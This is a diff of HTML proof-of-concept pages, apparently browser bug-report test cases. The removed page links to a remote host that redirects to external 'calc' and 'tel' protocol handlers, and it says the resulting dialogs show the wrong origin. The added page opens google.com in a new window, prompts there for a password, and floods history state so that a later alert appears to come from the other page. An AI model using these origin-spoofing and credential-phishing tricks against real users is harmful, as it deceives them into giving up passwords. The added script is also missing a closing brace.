@@ -1,23 +1,18 @@
-    <iframe
-      style="width:100vw;height:100vh;border:0"
-      srcdoc='
-        <!doctype html>
-        <html>
-        <head>
-          <style>
-            html { font-family: sans-serif; }
-          </style>
-        </head>
-        <body>
-          <h1>Links to server-side redirect</h1>
-          <p>Links are to another origin which performs server-side redirect to app or tel protocol. Dialogs show this page&#39;s origin instead of the linked origin.</p>
-          <p>
-            <a href="https://aogarantiza.com/chromium/external-protocol/calc.php">Calc</a>
-          </p>
-          <p>
-            <a href="https://aogarantiza.com/chromium/external-protocol/tel.php">Tel</a>
-          </p>
-        </body>
-        </html>
-      '>
-    </iframe>
+<html>
+<body>
+<a href="" target="_blank" onclick=clickme();>visit ianfette</a>
+<script>
+function clickme()
+{
+w1 = window.open('http://google.com/csi');
+p = w1.prompt("Enter your password to proceed");
+alert(p);
+a="aaaaaaaaaaaaaaaa";
+for (i = 0; i < 19; i++) { 
+a += a;
+}
+history.replaceState("example", "example", a);
+alert("This alert will be shown as 'From this page', while still rendering the page the link was clicked from");
+</script>
+</body>
+</html>
